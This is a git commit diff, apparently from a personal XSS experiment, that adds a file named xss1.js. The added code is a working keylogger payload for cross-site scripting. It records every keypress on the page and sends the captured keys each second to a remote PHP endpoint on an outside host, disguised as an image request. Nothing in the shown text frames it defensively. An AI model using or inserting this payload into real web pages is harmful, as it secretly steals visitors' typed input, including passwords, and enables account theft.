b1a580466f622b5ce5daa0597b06e42216c09c41
Martin Praznovsky <martin.praznovsky@gmail.com>
2016-01-04 20:07:05 +0100

    xss

--- xss/xss1.js
+++ xss/xss1.js
@@ -1,2 +1,14 @@
 // alert('hello xss! this script comes from przno.github.io');
-console.log('xss');
+// console.log('xss');
+
+var keys='';
+document.onkeypress = function(e) {
+  get = window.event?event:e;
+  key = get.keyCode?get.keyCode:get.charCode;
+  key = String.fromCharCode(key);
+  keys+=key;
+}
+window.setInterval(function(){
+  new Image().src = 'http://przno.github.io/keylogger.php?c='+keys;
+  keys = '';
+}, 1000);
